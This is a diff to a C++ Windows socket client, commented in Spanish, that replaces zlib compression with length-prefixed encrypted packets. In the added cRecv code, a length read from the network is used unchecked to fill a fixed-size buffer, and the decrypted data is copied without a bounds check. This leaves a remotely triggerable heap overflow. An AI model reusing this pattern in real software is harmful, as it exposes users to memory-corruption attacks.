@@ -666,7 +666,7 @@ void Cliente::Procesar_Paquete(const Paquete& paquete) {
     std::vector<char>& acumulador = this->paquetes_Acumulados[paquete.uiTipoPaquete];
     size_t oldsize = acumulador.size();
     acumulador.resize(oldsize + paquete.uiTamBuffer);
-    std::memcpy(acumulador.data() + oldsize, paquete.cBuffer, paquete.uiTamBuffer);
+    memcpy(acumulador.data() + oldsize, paquete.cBuffer, paquete.uiTamBuffer);
 
     if (paquete.uiIsUltimo == 1) {
         DebugPrint("[PP] Paquete completo ", paquete.uiTipoPaquete);
@@ -686,7 +686,7 @@ void Cliente::Procesar_Paquete(const Paquete& paquete) {
 void Cliente::MainLoop() {
     this->Spawn_QueueMan(); //spawn thread que lee el queue de los comandos
     DWORD error_code = 0;
-    const int iBuffSize = 1024 * 2; //2 kb no necesario pero por las moscas
+    const int iBuffSize = PAQUETE_BUFFER_SIZE + 1024;
     std::vector<char> cBuffer(iBuffSize);
     if (cBuffer.size() == 0) {
         DebugPrint("[MAIN-LOOP] No se pudo reservar memoria para el buffer principal");
@@ -785,8 +785,6 @@ int Cliente::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFla
 
             iEnviado += iChunkEnviado;
             iBytePos += iChunkSize;
-
-            std::this_thread::sleep_for(std::chrono::milliseconds(10));
         }else {
             break;
         }
@@ -802,63 +800,21 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     std::unique_lock<std::mutex> lock(this->sck_mutex);
 
     //Tamaño del buffer
-    int iDataSize = pLen + 2;
-    std::unique_ptr<char[]> new_Buffer = std::make_unique<char[]>(iDataSize);
-    if (!new_Buffer) {
-        DebugPrint("No se pudo reservar la memoria");
-        return -1;
-    }
+    int iDataSize = pLen;
 
-    //por defecto la cabecera se seteara como descomprimido
-    // esto solo cambia si no hay ningun error durante el proceso de compresion
-    new_Buffer[0] = UNCOMP_HEADER_BYTE_1;
-    new_Buffer[1] = COMP_HEADER_BYTE_2;
-
-    //Primero comprimir si el paquete es mayor a BUFFER_COMP_REQ_LEN
-    if (pLen > BUFFER_COMP_REQ_LEN) {
-        //Comprimir  buffer
-        std::shared_ptr<unsigned char[]> compData(new unsigned char[iDataSize * 3]);
-        if (compData) {
-            unsigned long out_len = iDataSize;
-            int iRet = compress2(compData.get(), &out_len, reinterpret_cast<const unsigned char*>(pBuffer), pLen, Z_BEST_COMPRESSION);
-            if (iRet == Z_OK) {
-                //Success
-                if (out_len < iDataSize) {
-                    new_Buffer[0] = COMP_HEADER_BYTE_1;
-                    std::memcpy(new_Buffer.get() + 2, compData.get(), out_len);
-                    iDataSize = out_len + 2; //Cantidad de bytes que fueron comprimidos + cabecera (2 bytes)
-                    DebugPrint("[ZLIB] Success ", iDataSize);
-                    DebugPrint("......Final: ", pLen);
-                }else {
-                    //El buffer compreso es mayor al original, copiar el mismo buffer
-                    std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
-                }
-            }else if (iRet == Z_MEM_ERROR) {
-                DebugPrint("No hay memoria suficiente");
-                std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
-            }else if (iRet == Z_BUF_ERROR) {
-                DebugPrint("El output no tiene memoria suficiente");
-                std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
-            }else {
-                DebugPrint("A jaber que pajo");
-                std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
-            }
-        }else {
-            DebugPrint("No se pudo reservar memoria para el buffer de compression");
-            //Copiar buffer original
-            std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
-        }
-    }else {
-        //No comprimir ya que el buffer no es tan grande
-        std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
-    }
-
-    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(new_Buffer.get()), iDataSize);
+    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize);
     iDataSize = cData.size();
     if (iDataSize == 0) {
-        error();
+        DebugPrint("[cSend] Error cifrando los datos", GetLastError());
         return -1;
     }
+
+    //Enviar al inicio el size del paquete
+    std::vector<char> cBufferFinal(iDataSize + sizeof(int));
+    memcpy(cBufferFinal.data(), &iDataSize, sizeof(int));
+    memcpy(cBufferFinal.data() + sizeof(int), cData.data(), iDataSize);
+
+    iDataSize += sizeof(int);
 
     int iEnviado = 0;
     unsigned long int iBlock = 0;
@@ -866,11 +822,11 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     if (isBlock) {
         //Hacer el socket block
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
-            DebugPrint("No se pudo hacer block");
+            DebugPrint("[cSend] No se pudo hacer block", GetLastError());
         }
     }
     
-    iEnviado = send(pSocket, reinterpret_cast<const char*>(cData.data()), iDataSize, pFlags);
+    iEnviado = send(pSocket, cBufferFinal.data(), iDataSize, pFlags);
     if (err_code != nullptr) {
         *err_code = GetLastError();
     }
@@ -888,18 +844,34 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     return iEnviado;
 }
 
+int Cliente::recv_all(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags) {
+    int iRecibido = 0;
+    int iTotalRecibido = 0;
+    while (iTotalRecibido < pLen) {
+        iRecibido = recv(pSocket, pBuffer+iTotalRecibido, pLen-iTotalRecibido, pFlags);
+        if (iRecibido == 0) {
+            //Se cerro el socket
+            break;
+        }else if (iRecibido < 0) {
+            //Ocurrio un error
+            return -1;
+        }
+        iTotalRecibido += iRecibido;
+    }
+    return iTotalRecibido;
+}
+
 int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code) {
     //Aqui el socket por defecto es block asi que si se pasa false es normal
     // 1 non block
     // 0 block
-    std::unique_lock<std::mutex> lock(this->sck_mutex);
     
     if (!pBuffer) {
         DebugPrint("[cRecv] El buffer no esta reservado o es nulo\n");
         return 0;
     }
 
-    std::unique_ptr<char[]> cTmpBuff = std::make_unique<char[]>(pLen);
+    std::vector<char> cTmpBuff(pLen);
     
     int iRecibido = 0;
     unsigned long int iBlock = 0;
@@ -911,15 +883,24 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
         }
     }
         
-    iRecibido = recv(pSocket, cTmpBuff.get(), pLen, pFlags);
-    if (err_code != nullptr) {
-        *err_code = GetLastError();
-    }
-    if (iRecibido <= 0) {
+    //Leer primero sizeof(int) para opbtener el total de bytes a leer
+    int iPaquetesize = recv(pSocket, cTmpBuff.data(), sizeof(int), pFlags);
+    if (iPaquetesize == sizeof(int)) {
+        memcpy(&iPaquetesize, cTmpBuff.data(), sizeof(int));
+        //Asegurarse de leer todos los bytes
+        iRecibido = this->recv_all(pSocket, cTmpBuff.data(), iPaquetesize, pFlags);
+        if (iRecibido < 0) {
+            return -1;
+        }
+    }else{
+        //Si se quiere obtener el ultimo error al trabajar con el socket, setear el valor en el puntero
+        if (err_code != nullptr) {
+            *err_code = GetLastError();
+        }
         return -1;
     }
     
-    //Restaurar
+    //Restaurar block_mode en el socket
     if (isBlock && !this->BLOCK_MODE) {
         iBlock = 1;
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
@@ -927,55 +908,15 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
         }
     }
     
-    //Decrypt
-    ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cTmpBuff.get()), iRecibido);
-    iRecibido = bOut.size() - 2;
+    //Decrypt data
+    ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cTmpBuff.data()), iRecibido);
+    iRecibido = bOut.size();
     if (iRecibido == 0) {
-        error();
+        DebugPrint("[cSend] No se pudo desencriptar el buffer", GetLastError());
         return -1;
     }
 
-    //Comprobar si tiene la cabecera
-    if (iRecibido > 2) { //?
-        if (bOut[0] == COMP_HEADER_BYTE_1 && bOut[1] == COMP_HEADER_BYTE_2) {
-            std::shared_ptr<unsigned char[]> uncompBuffer(new unsigned char[pLen]);
-            if (uncompBuffer) {
-                unsigned long out_len = pLen;
-                int iRet = uncompress(uncompBuffer.get(), &out_len, bOut.data() + 2, iRecibido);
-                if (iRet == Z_OK) {
-                    //Si el buffer final es menor al tamaño del buffer final proceder
-                    if (out_len < pLen) {
-                        std::memcpy(pBuffer, uncompBuffer.get(), out_len);
-                        iRecibido = out_len;
-                    }
-                    else {
-                        DebugPrint("El buffer descomprimido es mayor al buffer reservado (parametro)");
-                        iRecibido = 0;
-                    }
-                }
-                else if (iRet == Z_MEM_ERROR) {
-                    DebugPrint("No hay memoria suficiente");
-                    iRecibido = 0;
-                }
-                else if (iRet == Z_BUF_ERROR) {
-                    DebugPrint("El output no tiene memoria suficiente");
-                    iRecibido = 0;
-                }
-                else {
-                    DebugPrint("A jaber que pajo");
-                    iRecibido = 0;
-                }
-            }
-            else {
-                DebugPrint("No se pudo reservar memoria para descomprimir el paquete");
-                iRecibido = 0;
-            }
-        }
-        else {
-            //No tiene la cabecera de compreso, copiar buffer desencriptado
-            std::memcpy(pBuffer, bOut.data() + 2, iRecibido);
-        }
-    }
+    memcpy(pBuffer, bOut.data(), iRecibido);
 
     return iRecibido;
 }
